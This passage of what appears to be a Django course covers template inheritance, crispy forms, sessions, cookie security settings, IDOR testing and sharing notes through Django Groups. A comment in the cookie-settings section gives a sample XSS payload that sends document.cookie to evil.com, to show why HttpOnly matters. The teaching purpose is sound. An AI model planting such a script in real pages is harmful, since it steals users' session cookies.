Problem Example Duplication 15 lines per field × 6 fields = 90 lines just for the form Changing a class Want form-control-lg → edit every <input> in every template Synchronization Added a field in models.py → don't forget to update the template No system Every developer writes it "a little differently"

docs.title: Solution: separation of responsibilities
docs.text:
BEFORE (Tier 2):
  forms.py:    fields + widget attrs + validation
  template:    label + input + error + help_text   ← 80 lines of HTML

AFTER (Tier 3):
  forms.py:    fields + FormHelper + Layout         ← structure described in Python code
  template:    {% crispy form %}                    ← 1 line

Key idea: A form is a Python object. Its structure is described in Python code (Layout), not in HTML in the template. The template becomes thin — it only says where to render.

docs.title: With Template Inheritance
docs.text:
<!-- note_list.html — 10 lines! -->
{% extends 'layouts/dashboard.html' %}
{% block title %}Нотатки{% endblock %}
{% block topbar_title %}Мої нотатки{% endblock %}
{% block content %}
    <!-- only the real content -->
{% endblock %}

Advantage: Changing the navbar — only layouts/dashboard.html. All 20 pages are updated automatically.

docs.title: The 3-level hierarchy (SaaS Dashboard pattern)
docs.text:
base.html                          ← Level 1: HTML shell
│  Bootstrap CDN, meta, <body>
│  {% block body %}
│
└── layouts/dashboard.html        ← Level 2: Application layout
       Sidebar + Topbar
       Django Messages
       {% block content %}
       {% block topbar_title %}
       │
       ├── hello_app/note_list.html       ← Level 3: Page content
       ├── hello_app/note_form.html
       ├── hello_app/notebook_list.html
       └── hello_app/tag_form.html

docs.title: What each level is responsible for
docs.text: Level File Responsibility Changes when... 1 base.html HTML5 structure, Bootstrap CDN, Bootstrap JS Changing the CDN version, adding global CSS 2 layouts/dashboard.html Sidebar, Topbar, Messages, SaaS layout Changing navigation, new menu items, a new sidebar 3 hello_app/*.html Page-specific content The logic of a specific feature

docs.title: What it looks like in code
docs.text:
base.html — only the HTML skeleton:

<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>CrispyNotes</title>

  <!-- Bootstrap 5 CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <!-- Bootstrap Icons -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">

  {% block extra_css %}{% endblock %}
</head>
<body>

  {% block body %}{% endblock %}    ← the whole application goes here

  <!-- Bootstrap JS -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  {% block extra_js %}{% endblock %}
</body>
</html>

Rule: base.html knows nothing about the sidebar, navigation or content. It is responsible only for: "I am a correct HTML5 document with Bootstrap".

layouts/dashboard.html — the layout (extends base):

{% extends 'base.html' %}
{% block body %}
  <div class="d-flex vh-100">
    <nav><!-- Sidebar --></nav>
    <div class="flex-grow-1">
      <header>{% block topbar_title %}{% endblock %}</header>
      <main>{% block content %}{% endblock %}</main>
    </div>
  </div>
{% endblock %}

note_list.html — a page (extends dashboard):

{% extends 'layouts/dashboard.html' %}
{% block topbar_title %}Мої нотатки{% endblock %}
{% block content %}
  <!-- content only, the sidebar/topbar already come from the parent -->
{% endblock %}

docs.title: Inheritance flow
docs.text:
Request /notes/
     │
     ▼
views.note_list()
  └─► render('hello_app/note_list.html', context)
           │
           ▼
      Django Template Engine
           │
      note_list.html extends dashboard.html
           │
      dashboard.html extends base.html
           │
      base.html — the root template
           │
           ▼
      Assembly: base → dashboard → note_list → HTML
           │
           ▼
      200 OK  ·  full HTML page

docs.title: How Django finds a template
docs.text:
render(request, 'hello_app/note_list.html', context)
    ↓
Django searches DIRS:
  1. BASE_DIR/templates/hello_app/note_list.html → not found

Django searches APP_DIRS (each INSTALLED_APP):
  2. hello_app/templates/hello_app/note_list.html → FOUND ✓

Loads note_list.html:
  Encounters {% extends 'layouts/dashboard.html' %}

Django searches for layouts/dashboard.html:
  1. BASE_DIR/templates/layouts/dashboard.html → FOUND ✓

Loads dashboard.html:
  Encounters {% extends 'base.html' %}

Django searches for base.html:
  1. BASE_DIR/templates/base.html → FOUND ✓

Rendering from base.html → dashboard.html → note_list.html
Blocks are filled from the most specific to the most general.

docs.title: Comparison: with inheritance vs without
docs.text: Without inheritance With the 3-level hierarchy New page Copy all the HTML 5 lines: {% extends %} + content Changing navigation Edit every file Only dashboard.html Bootstrap CDN Every file Only base.html Sidebar Copy into every file Once, in dashboard.html

docs.title: {% block.super %} — the rule
docs.text:
{# If the child wants to EXTEND a block (not overwrite it): #}
{% block extra_css %}
    {{ block.super }}   {# ← inserts the content of the parent block #}
    <link rel="stylesheet" href="{% static 'css/notes-editor.css' %}">
{% endblock %}

{# Result: CSS from layouts/dashboard.html + this page's CSS #}
{# Without block.super: the CSS of layouts/dashboard.html will be REPLACED #}

Rule: If a child template wants to add to a parent block (rather than replace it), use {{ block.super }}. If you want to replace it completely, just write inside {% block %} without {{ block.super }}.

docs.title: Replacing vs extending a block
docs.text:
<!-- base.html -->
{% block extra_css %}
<link rel="stylesheet" href="{% static 'css/global.css' %}">
{% endblock %}

<!-- layouts/dashboard.html -->
{% extends 'base.html' %}
{% block extra_css %}
{{ block.super }}                              {# → inserts global.css from base.html #}
<link rel="stylesheet" href="{% static 'css/dashboard.css' %}">
{% endblock %}

<!-- note_form.html -->
{% extends 'layouts/dashboard.html' %}
{% block extra_css %}
{{ block.super }}                              {# → global.css + dashboard.css from the parents #}
<link rel="stylesheet" href="{% static 'notes_app/css/editor.css' %}">
{% endblock %}

Result in the browser (CSS order): 

<link rel="stylesheet" href="/static/css/global.css">       <!-- base.html -->
<link rel="stylesheet" href="/static/css/dashboard.css">    <!-- dashboard.html -->
<link rel="stylesheet" href="/static/notes_app/css/editor.css"> <!-- note_form.html -->

Without {{ block.super }}: 

<!-- note_form.html WITHOUT block.super: -->
{% block extra_css %}
<link rel="stylesheet" href="{% static 'notes_app/css/editor.css' %}">
{% endblock %}

{# Result: only editor.css — global.css and dashboard.css are MISSING! #}

docs.title: When block.super is NOT needed
docs.text:
<!-- note_list.html — completely replace the topbar_title block -->
{% block topbar_title %}
    Мої нотатки
{% endblock %}
{# dashboard.html has {% block topbar_title %}Застосунок{% endblock %} — we replace it completely #}
{# block.super is not needed here — we don't care about the parent content #}

How to choose:

I want to... What to write Completely replace the block content Just {% block %}...{% endblock %} Add to the parent's content {{ block.super }} + new content Pass the parent content through unchanged {{ block.super }} (the whole block)

docs.title: When {% extends %} doesn't work — errors and causes
Error 1: TemplateSyntaxError — extends is not the first tag
docs.text:
TemplateSyntaxError at /notes/
<ExtendsNode: extends 'base.html'> must be the first tag in the template.

<!-- ❌ CAUSE: there is another tag before {% extends %} (text, whitespace and {# comments #} are allowed) -->
{% load static %}   {# ← THIS IS AN ERROR! load before extends #}
{% extends 'base.html' %}

<!-- ✅ SOLUTION: extends is always the first line -->
{% extends 'base.html' %}
{% load static %}   {# load — after extends #}

Rule: {% extends %} must be the first tag in the template. Even {% load %} goes after it.

docs.title: Error 2: TemplateDoesNotExist
docs.text:
TemplateDoesNotExist: layouts/dashboard.html

Possible causes:

# 1. TEMPLATES is not configured correctly in settings.py
TEMPLATES = [{
    'BACKEND': 'django.template.backends.django.DjangoTemplates',
    'DIRS': [BASE_DIR / 'templates'],   # ← this line is required for project-level templates
    'APP_DIRS': True,                   # ← True = search in app/templates/
    'OPTIONS': {'context_processors': [...]}
}]

# 2. The file exists, but in the wrong place
# ⚠️ ALSO FOUND (APP_DIRS=True), but this is an app template, not a project one:
myproject/hello_app/templates/layouts/dashboard.html  # ← found as 'layouts/dashboard.html' ✓

# ✅ RECOMMENDED for project-level templates:
myproject/templates/layouts/dashboard.html   # ← if BASE_DIR/templates is in DIRS

# 3. OS type (Linux ≠ Windows): case matters
# base.HTML ≠ base.html on Linux

docs.title: Error 3: Blocks are not displayed — the content disappears
docs.text:
<!-- ❌ CAUSE: the block names do not match -->

<!-- base.html -->
{% block main_content %}{% endblock %}   ← 'main_content'

<!-- note_list.html -->
{% extends 'base.html' %}
{% block content %}                       ← 'content' — a different name!
    This content will NEVER be displayed
{% endblock %}

<!-- ✅ SOLUTION: the same names in the parent and the child -->
<!-- base.html -->
{% block content %}{% endblock %}

<!-- note_list.html -->
{% extends 'base.html' %}
{% block content %}
    Now it is displayed!
{% endblock %}

docs.title: Error 4: Content outside blocks is ignored
docs.text:
{% extends 'base.html' %}

<h1>This heading will NEVER be displayed</h1>   {# ← outside a block = ignored #}

{% block content %}
    <p>This is displayed.</p>
{% endblock %}

<footer>This is ignored too</footer>   {# ← outside a block = ignored #}

Rule: In a template that uses {% extends %}, all content must be inside a {% block %}. Everything outside blocks is ignored by the Django Template Engine.

docs.title: {% include %} vs {% extends %}
docs.text:
Two mechanisms for reusing templates — for different tasks.

{% extends %} {% include %} What for A page inherits the parent's structure Insert a piece of HTML into the current template How many One parent (one extends) Unlimited Context Inherited automatically Inherited + you can pass a separate one Blocks {% block %} / {% endblock %} None Example note_list.html extends dashboard.html A note card component in a loop 
<!-- ✅ include — for repeated components -->

{# note_list.html #}
{% for note in notes %}
    {% include 'notes_app/components/_note_card.html' with note=note %}
{% endfor %}

{# _note_card.html — an isolated card component #}
<div class="card mb-3">
    <div class="card-body">
        <h5 class="card-title">{{ note.title }}</h5>
        <p class="card-text">{{ note.content|truncatewords:20 }}</p>
    </div>
</div>

with in {% include %} — passes extra variables into the component's context. The component also has access to the template's overall context (all variables from render(context)).

docs.title: TEMPLATES settings in settings.py
docs.text:
# settings.py
from pathlib import Path
BASE_DIR = Path(__file__).resolve().parent.parent

TEMPLATES = [{
    'BACKEND': 'django.template.backends.django.DjangoTemplates',

    # DIRS — where to look for templates OUTSIDE the apps (project-level templates)
    # This is where these live: base.html, layouts/, registration/ etc.
    'DIRS': [BASE_DIR / 'templates'],

    # APP_DIRS = True — Django automatically searches in each INSTALLED_APP
    # in the directory: app_name/templates/
    # This is where these live: notes_app/templates/notes_app/*.html
    'APP_DIRS': True,

    'OPTIONS': {
        'context_processors': [
            'django.template.context_processors.debug',
            'django.template.context_processors.request',
            'django.contrib.auth.context_processors.auth',
            'django.contrib.messages.context_processors.messages',
        ],
    },
}]

Search order for the template 'notes_app/note_list.html':

1. BASE_DIR/templates/notes_app/note_list.html   ← DIRS (first)
2. notes_app/templates/notes_app/note_list.html  ← APP_DIRS (if not found in DIRS)

Convention: app templates → app/templates/app_name/file.html
            project templates → BASE_DIR/templates/file.html

notes_chat_app/
├── templates/                ← DIRS in TEMPLATES[0]['DIRS']

docs.title: Step 5. Auth and Security
docs.text:
This step covers two projects: crispy_notes_project (Steps 1–6) and notes_chat_app (Steps 7–11). The first is a standalone application on SQLite without Docker. The second is a production-like stack with Docker, PostgreSQL, Redis, Group sharing and a WebSocket chat.

Prerequisites

Before you start, make sure you have completed:

  • Step 1. Hello Django — the first HttpResponse, URL routing
  • Step 2. Bootstrap Notes — ModelForm, PRG, Bootstrap CRUD
  • Step 3. CRUD and architecture — Services & Selectors, PostgreSQL
  • Step 4. Templates and Forms — Crispy Forms, Dashboard, Context Processor

docs.title: Auth Basics — Authentication vs Authorization
docs.text:
The main question: Who are you, and what are you allowed to do?

These two questions are the foundation of any security system. Django answers them through two different systems.

docs.title: Analogy — a passport and a concert ticket
docs.text:
• Passport = Authentication (AuthN): "Who are you?" — confirms identity. A security guard checks the document and makes sure it is genuine.
  • Ticket = Authorization (AuthZ): "Where are you allowed to go?" — defines permissions. The usher checks the ticket and decides where you can sit (VIP or the stalls).

At an airport: security checks your passport (AuthN), then your boarding pass (AuthZ). A passport without a ticket — you won't be let in. A ticket without a passport — same thing.

docs.title: Table: AuthN vs AuthZ
docs.text: Authentication (AuthN) Authorization (AuthZ) Question Who are you? What are you allowed to do? Answer Password check Permission check on an object Django tool authenticate(), login() @login_required, get_object_or_404 Where it is checked AuthenticationMiddleware Separately in each view What if it fails A form with an error 302 Redirect or 404/403

docs.title: Django Auth components
docs.text:
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required

# 1. Check credentials (AuthN):
user = authenticate(request, username='alice', password='secret')
# → Django: looks up the User with username='alice'
# → Checks the PBKDF2 password hash in the DB
# → Returns the User object if it matches, or None

# 2. Start a session after a successful login:
if user is not None:
    login(request, user)   # ← creates a session_id in the DB + a cookie in the browser
    # Now request.user = alice in all subsequent requests

# 3. End the session:
logout(request)   # ← deletes the session record from the DB + forcibly clears the cookie

docs.title: Middleware chain: who sets request.user
docs.text:
Every HTTP request passes through the WHOLE middleware chain before it reaches the view. In notes_chat_app it looks like this:

Every request passes through the WHOLE middleware chain (settings.py → MIDDLEWARE):

1. DebugExceptionMiddleware  — the project's own middleware (notes_project/middleware.py),
                               added only when DEBUG=True: shows a traceback in dev
2. SecurityMiddleware        — HTTPS redirect, HTTP security headers
3. DebugToolbarMiddleware    — Django Debug Toolbar
4. SessionMiddleware         — reads Cookie: sessionid=... → loads the session from the DB
5. CommonMiddleware          — trailing slash, Content-Type
6. CsrfViewMiddleware        — checks csrfmiddlewaretoken in POST requests
7. AuthenticationMiddleware  — reads the session → sets request.user
   │                           If there is a session → request.user = User(id=42)
   │                           If not                → request.user = AnonymousUser
8. MessageMiddleware         — Django messages flash framework
9. XFrameOptionsMiddleware   — X-Frame-Options: DENY header
   │
   ▼
View function (request.user is already set!)

Middleware order matters:

  • SessionMiddleware must come before AuthenticationMiddleware — Auth reads the session
  • CsrfViewMiddleware before the view — it checks CSRF before any view is called
  • By default CsrfViewMiddleware keeps its secret in the csrftoken cookie, not in the session; SessionMiddleware must come before it only when CSRF_USE_SESSIONS = True

In crispy_notes_project the middleware chain is shorter (without DebugExceptionMiddleware and DebugToolbarMiddleware), but the principle is the same.

docs.title: @login_required — what it does and where it lives
docs.text:
# notes_app/views.py
from django.contrib.auth.decorators import login_required

@login_required   # ← a decorator, checks request.user.is_authenticated
def note_list(request):
    # If request.user = AnonymousUser:
    #   → redirect to LOGIN_URL (settings.py) + ?next=/notes/
    #   → 302 /accounts/login/?next=/notes/
    # If request.user = User(id=42):
    #   → runs the view normally
    notes = selectors.get_user_notes(request.user)
    return render(request, 'notes_app/note_list.html', {'notes': notes})

# settings.py — where to redirect users who are not logged in:
LOGIN_URL = '/accounts/login/'
LOGIN_REDIRECT_URL = '/notes/'           # where to go AFTER a successful login
LOGOUT_REDIRECT_URL = '/accounts/login/' # where to go AFTER logging out

Important: @login_required is only AuthN ("are you logged in?"). It does NOT check whether this particular note belongs to you. That requires a separate AuthZ step in the view (see Object Permissions).

docs.title: Sessions — how Django remembers the user
docs.text: Problem: HTTP is a stateless protocol. Every request is as if it were "the first". The server does not know who you are unless you send proof.

docs.title: Analogy — a café loyalty card
docs.text:
Imagine a café where you earn points for every coffee. Without a card, the waiter forgets you after every visit. With a card, the points add up.

Session cookie = the loyalty card: the browser stores it and automatically presents it with every request.

docs.title: Step-by-step flow: Login → Cookie → Next request
docs.text:
STEP 1: Alice clicks "Log in"
─────────────────────────────────────────────────────────────────────────
Browser:  POST /accounts/login/  {username: 'alice', password: 'secret'}
Django:   CsrfViewMiddleware → checks csrfmiddlewaretoken ✓
          authenticate('alice', 'secret') → User(id=42) ✓
          login(request, user)
            → INSERT INTO django_session
              (session_key='xK9mPq', session_data={_auth_user_id: 42}, expire_date=...)
          Response:  302 /notes/
          Header:    Set-Cookie: sessionid=xK9mPq; HttpOnly; SameSite=Lax; Path=/

STEP 2: The browser stores the cookie. Alice sees /notes/
─────────────────────────────────────────────────────────────────────────
Browser stores: sessionid=xK9mPq (in the browser's protected storage)

STEP 3: Alice's next request (GET /notes/)
─────────────────────────────────────────────────────────────────────────
Browser:  GET /notes/
Header:   Cookie: sessionid=xK9mPq   ← sent automatically!
          Django SessionMiddleware:
            SELECT * FROM django_session WHERE session_key='xK9mPq'
            → session_data = {_auth_user_id: 42}
          Django AuthenticationMiddleware:
            SELECT * FROM auth_user WHERE id=42
            → request.user = User(id=42, username='alice')
View:     @login_required → request.user.is_authenticated → True ✓
          notes = selectors.get_user_notes(request.user)
          → SQL: SELECT * FROM note WHERE user_id=42 OR group_id IN (...)

STEP 4: Logout
─────────────────────────────────────────────────────────────────────────
Browser:  POST /accounts/logout/  (with the CSRF token in the POST body)
Django:   logout(request)
            → DELETE FROM django_session WHERE session_key='xK9mPq'
          Response:  302 /accounts/login/
          Header:    Set-Cookie: sessionid=; expires=Thu, 01 Jan 1970 00:00:00 GMT
Browser:  Deletes the cookie. request.user → AnonymousUser.

docs.title: The cookie in DevTools: how to see the session
docs.text:
Chrome DevTools → Application → Storage → Cookies → http://localhost

Field         Value
─────────────────────────────────────────────────
Name          sessionid
Value         xK9mPq...  (a 32-character random key)
Domain        localhost
Path          /
Expires       (in 2 weeks by default)
Size          ~100 B
HttpOnly      ✓  (JS cannot read it!)
SameSite      Lax

Try it in the Console:
  document.cookie  →  'csrftoken=abc123'
  (sessionid is missing — HttpOnly!)

docs.title: Cookie settings in settings.py
docs.text:
# settings.py:

SESSION_COOKIE_HTTPONLY = True
# ↑ JS cannot read sessionid via document.cookie
#   Protection against XSS attacks that try to steal the cookie:
#   <script>fetch('evil.com?c='+document.cookie)</script>
#   → with HttpOnly: sessionid is missing from document.cookie → the attack gets nothing

SESSION_COOKIE_SAMESITE = "Lax"
# ↑ "Lax": the cookie is sent only from the same site OR
#   on top-level navigation GET requests (links)
#   Protection against CSRF: evil.com cannot send a POST with your cookie
#   "Strict" — stricter: the cookie is not sent even when following links from external sites
#   "None" — unsafe without the Secure (HTTPS) flag

CSRF_COOKIE_HTTPONLY = False
# ↑ False: JS can read csrftoken (needed for fetch/axios requests with a CSRF header)
#   If you don't use JS for forms → True for strict protection

# Production HTTPS (uncomment when you have an SSL certificate):
# SESSION_COOKIE_SECURE = True   # cookie only over HTTPS (not HTTP)
# CSRF_COOKIE_SECURE = True

HttpOnly and XSS: even if an attacker injects a <script> into the page and tries to steal the session cookie via document.cookie, they will get an empty string or only csrftoken. sessionid will not be in the result, because HttpOnly forbids JS from reading this cookie.

docs.title: IDOR Test — manual check
docs.text:
Run this test to make sure the IDOR protection works:

1. Log in as alice (demo_alice/demo1234)

2. Go to any note: /notes/
   Remember the pk of one of your notes (for example pk=1)

3. Open a second tab or an incognito window
   Log in as bob (demo_bob/demo1234)

4. In the browser where you are bob, type the URL by hand:
   http://localhost/notes/1/edit/     ← alice's note pk!

5. Expected result:
   ✓ 404 Not Found  — IDOR protection works
   ✗ If the edit form is shown — IDOR vulnerability!

6. Also check:
   http://localhost/notes/1/delete/   ← alice's note pk
   → it must also return 404

docs.title: 403 Forbidden on POST forms
docs.text:
Symptom: after submitting the form — "403 Forbidden: CSRF verification failed"

Cause: {% csrf_token %} is missing from the form

Fix:
  <form method="post">
    {% csrf_token %}    ← REQUIRED!
    ...
  </form>

docs.title: Logout via GET does not work
docs.text:
Symptom: <a href="/accounts/logout/">Вийти</a> does not log you out (Django 4.1+)

Cause: LogoutView accepts only POST requests (Django 4.1+ security fix)

Fix:
  <form method="post" action="{% url 'logout' %}">
    {% csrf_token %}
    <button type="submit">Вийти</button>
  </form>

docs.title: request.user = AnonymousUser inside a view
docs.text:
Symptom: `request.user.is_authenticated` → False, even though the user is logged in

Cause 1: `SessionMiddleware` or `AuthenticationMiddleware` was removed from MIDDLEWARE
Cause 2: The middleware order is broken (Auth comes before Session)

Fix:
  # settings.py — check the order:
  MIDDLEWARE = [
      ...
      'django.contrib.sessions.middleware.SessionMiddleware',   # ← Session first
      ...
      'django.contrib.auth.middleware.AuthenticationMiddleware',  # ← then Auth
      ...
  ]

docs.title: The Password Reset email does not arrive (dev)
docs.text:
Symptom: you filled in the password_reset form, but nothing happens

Cause: you are looking for the email in the browser rather than in the logs

Fix for crispy_notes_project:
  Look at the terminal where runserver is running — the email text will be there

Fix for notes_chat_app:
  docker compose logs -f web
  # Look for "Subject: Password reset on localhost"

docs.title: The IDOR vulnerability is still there
docs.text:
Symptom: another user can edit someone else's note

Cause: the view uses get_object_or_404(Note, pk=pk) without user=

Fix for personal objects:
  note = get_object_or_404(Note, pk=pk, user=request.user)

Fix for shared objects (Note with a group):
  user_groups = request.user.groups.all()
  note = get_object_or_404(
      Note.objects.filter(Q(user=request.user) | Q(group__in=user_groups)),
      pk=pk,
  )
  if note.user != request.user:
      messages.error(request, 'Ти не можеш редагувати чужу нотатку.')
      return redirect('notes_app:note_detail', pk=pk)

docs.title: Deleting a group deletes notes
docs.text:
Symptom: after a group is deleted, the members' notes disappear

Cause: Note.group = ForeignKey(Group, on_delete=CASCADE)

Fix:
  Note.group = ForeignKey(
      Group,
      on_delete=models.SET_NULL,   # ← SET_NULL, not CASCADE!
      null=True,
      blank=True,
  )
  # After this — a new migration: python manage.py makemigrations

docs.title: Summary: what to look for and where
docs.text: Concept Where in the code AuthN vs AuthZ views.py — @login_required + Q-filter for access + note.user != request.user for editing Middleware chain settings.py — the MIDDLEWARE list + order Session flow settings.py — SESSION_COOKIE_* + Django session framework Login/Logout templates/registration/login.html + urls.py auth.urls POST logout dashboard.html — <form method="post" action="{% url 'logout' %}"> Password Reset templates/registration/password_reset_*.html (5 files) DEV email docker compose logs -f web — find the /accounts/reset/... URL Password Change templates/registration/password_change_*.html + dashboard dropdown IDOR protection views.py — personal objects: get_object_or_404(Model, pk=pk, user=...), shared ones: Q-filter + owner check 404 not 403 views.py — "do not reveal that someone else's object exists" Group FK SET_NULL models.py — Note.group + ShoppingList.group Q-filter selectors.py — Q(user=user) \| Q(group__in=user_groups) N+1 protection selectors.py — select_related('notebook', 'group'), prefetch_related('tags') Group CRUD services.py — create_group, add_user_to_group, delete_group 3-action POST views.py group_detail — action='add'/'remove'/'leave' SET_NULL cascade group_confirm_delete.html — explanation of the behavior Security settings settings.py — HTTPONLY, SAMESITE, X_FRAME_OPTIONS, DEBUG=False ngrok CSRF settings.py — CSRF_TRUSTED_ORIGINS from the NGROK_DOMAIN env PBKDF2 passwords the auth_user.password field — pbkdf2_sha256$600000$salt$hash

docs.title: Practical exercise
docs.text:
Do it on your own:

  1. Basic: Start notes_chat_app (docker compose up --build), register a new user, test Password Reset — find the email in docker compose logs web and change the password.

  2. Intermediate: Create a group "My team" and add demo_bob to it. Create a note and assign it to this group. Log in as demo_bob and make sure the note is visible at /notes/.

  3. Advanced: Run the IDOR test by hand (described above). Make sure you get a 404. Then temporarily change get_object_or_404(Note.objects.filter(...), pk=pk) to get_object_or_404(Note, pk=pk) and repeat the test — make sure the IDOR appears. Restore the protection.

  4. Exploratory: Open DevTools → Application → Cookies after logging in. Find the sessionid cookie. Make sure that HttpOnly = ✓. Open the Console and run document.cookie — make sure sessionid is missing from the result.

docs.title: Group Sharing — Shared access via Django Groups
docs.text: Idea: Alice wants to share notes with her team. She creates a group "Dev team" and adds Bob. Both of them can see the notes and shopping lists assigned to this group.

docs.title: Django's built-in Group model
docs.text:
Django already has a ready-made Group model in django.contrib.auth:

from django.contrib.auth.models import Group

# Every Group has:
#   id          — PK
#   name        — the name ('Family', 'Team', 'Class')
#   user_set    — M2N relation with User (via the auth_user_groups junction table)
#   permissions — M2N relation with Permission (for role-based access — not our case)

# In notes_app we use Group for SHARING DATA between users,
# not for the Django Permission System (is_staff, is_superuser, permissions).

docs.title: ER diagram: User, Group, Note, ShoppingList
Group FK in the models: Note and ShoppingList
docs.text:
Location: notes_app/models.py

from django.contrib.auth.models import User, Group


class Note(models.Model):
    user = models.ForeignKey(
        User, on_delete=models.CASCADE, related_name='notes'
    )
    # ── Group FK: for shared access ──────────────────────────────────────────
    group = models.ForeignKey(
        Group,
        on_delete=models.SET_NULL,  # ← SET_NULL, not CASCADE!
        null=True,                   # ← NULL = personal note (default)
        blank=True,                  # ← the field is optional in the form
        related_name='notes',
    )
    # ── the remaining fields ──────────────────────────────────────────────────
    notebook = models.ForeignKey(
        'Notebook', on_delete=models.SET_NULL, null=True, blank=True,
        related_name='notes'
    )
    title    = models.CharField(max_length=200)
    content  = models.TextField(blank=True)
    priority = models.PositiveSmallIntegerField(default=1)
    is_pinned    = models.BooleanField(default=False)
    is_archived  = models.BooleanField(default=False)
    created_at   = models.DateTimeField(auto_now_add=True)
    updated_at   = models.DateTimeField(auto_now=True)
    tags = models.ManyToManyField('Tag', blank=True)


class ShoppingList(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    # ShoppingList also has a group FK for sharing:
    group = models.ForeignKey(
        Group,
        on_delete=models.SET_NULL,
        null=True, blank=True,
        related_name='shopping_lists',
    )
    title = models.CharField(max_length=200)
    store_name = models.CharField(max_length=100, blank=True)

docs.title: Why SET_NULL and not CASCADE?
docs.text:
CASCADE:  deleting a group → ALL of the group's notes are deleted
          Alice deletes "Dev team" → Bob loses the shared notes!
          Unexpected and irreversible.

SET_NULL: deleting a group → the notes remain but become personal (group=NULL)
          Alice deletes the group → the notes move to their owners' personal spaces
          Safe behavior: no data is lost, only the sharing stops.

Django performs SET_NULL automatically as part of the cascading delete:
  DELETE FROM auth_group WHERE id=5
  → UPDATE note SET group_id=NULL WHERE group_id=5     ← automatically!
  → UPDATE shoppinglist SET group_id=NULL WHERE group_id=5  ← this too!

docs.title: Q-filter: "mine or the group's"
docs.text:
# notes_app/selectors.py
from django.db.models import Q

def get_user_notes(user, *, archived=False, notebook=None, tag=None, search=None):
    """Returns the user's notes + notes of groups the user is a member of."""
    user_groups = user.groups.all()   # all of the user's groups (1 SQL)
    qs = Note.objects.filter(
        Q(user=user) |               # own notes
        Q(group__in=user_groups),    # notes of groups the user is a member of
        is_archived=archived,
    ).select_related('notebook', 'group').prefetch_related('tags')
    # ...
    return qs.order_by('-is_pinned', '-priority', '-updated_at')

Alice is in the groups: [Team(id=1), Family(id=3)]

SQL (simplified):
  SELECT * FROM note
  WHERE (user_id = 42)              -- Alice's personal notes
     OR (group_id IN (1, 3))        -- notes of her groups
  AND is_archived = FALSE
  ORDER BY is_pinned DESC, priority DESC, updated_at DESC

Location: notes_app/selectors.py

from django.db.models import Q, Count
from django.contrib.auth.models import Group
from .models import Note, Notebook, Tag


def get_user_notes(user, *, archived=False, notebook=None, tag=None, search=None):
    """
    Returns the user's notes + notes of groups the user is a member of.

    Q(user=user) | Q(group__in=user_groups) — the key Q-filter.
    select_related/prefetch_related: minimum SQL queries (no N+1).
    """
    user_groups = user.groups.all()
    qs = Note.objects.filter(
        Q(user=user) | Q(group__in=user_groups),   # own or the group's
        is_archived=archived,
    ).select_related(
        'notebook',   # JOIN → no +1 SQL when displaying the notebook color
        'group',      # JOIN → no +1 SQL when displaying the group name
    ).prefetch_related(
        'tags',       # IN query → no +1 SQL when displaying tags
    )

    if notebook is not None:
        qs = qs.filter(notebook=notebook)
    if tag is not None:
        qs = qs.filter(tags=tag)
    if search:
        qs = qs.filter(
            Q(title__icontains=search) | Q(content__icontains=search)
        )

    return qs.order_by('-is_pinned', '-priority', '-updated_at')


def get_user_groups(user):
    """The user's groups with the member count (annotate)."""
    return user.groups.annotate(
        member_count=Count('user')
        # annotate: adds a 'member_count' field to each Group object
        # SQL: SELECT g.*, COUNT(ug.user_id) as member_count
        #        FROM auth_group g
        #        JOIN auth_user_groups ug ON ug.group_id = g.id
        #        WHERE g.id IN (Alice's group ids)
        #        GROUP BY g.id
    ).order_by('name')


def get_group_with_members(group_id, user):
    """
    Returns the group with its members ONLY if the user is a member of it.
    If not a member → None (not Http404 — the view decides).
    """
    try:
        group = Group.objects.prefetch_related('user_set').get(pk=group_id)
        if not group.user_set.filter(pk=user.pk).exists():
            return None   # not a member → the view will return 404
        return group
    except Group.DoesNotExist:
        return None

Explanation of select_related vs prefetch_related:

# select_related: JOIN → one SQL query
# Used for ForeignKey and OneToOne (N-to-1)
.select_related('notebook')
# SQL: SELECT note.*, nb.* FROM note LEFT JOIN notebook nb ON note.notebook_id = nb.id

# prefetch_related: a separate IN query → two SQL queries
# Used for ManyToMany (M-to-N)
.prefetch_related('tags')
# SQL 1: SELECT note.* FROM note WHERE ...
# SQL 2: SELECT tag.* FROM tag INNER JOIN note_tags ON ... WHERE note_id IN (1,2,3,...)

# Without select_related/prefetch_related → the N+1 problem:
# 10 notes → 10 queries for notebook + 10 for tags = 21 SQL queries!
# With optimization → 2 SQL queries (notes JOIN notebooks + tags)

from django.contrib.auth.models import Group, User
from django.db import transaction


def create_group(*, name, creator):
    """
    Creates a group and automatically adds creator as the first member.

    Without a transaction: if add() fails → the Group exists with no members.
    With atomic(): both operations succeed, or both are rolled back.
    """
    with transaction.atomic():
        group = Group.objects.create(name=name)
        group.user_set.add(creator)   # M:N INSERT into auth_user_groups
    return group


def add_user_to_group(group, username):
    """
    Adds a user to the group by username.
    Returns (True, '') or (False, 'error message').

    Why not raise Exception?
    The view expects a tuple (ok, msg) so it can show the error in the form without a 500.
    """
    try:
        user = User.objects.get(username=username)
    except User.DoesNotExist:
        return False, f'Користувача «{username}» не знайдено.'

    if group.user_set.filter(pk=user.pk).exists():
        return False, f'«{username}» вже є членом цієї групи.'

    group.user_set.add(user)
    return True, ''


def remove_user_from_group(group, user):
    """Removes a user from the group. M:N DELETE from auth_user_groups."""
    group.user_set.remove(user)


def delete_group(group):
    """
    Deletes the group.
    Django automatically applies SET_NULL to Note.group and ShoppingList.group.
    No notes are lost.
    """
    group.delete()
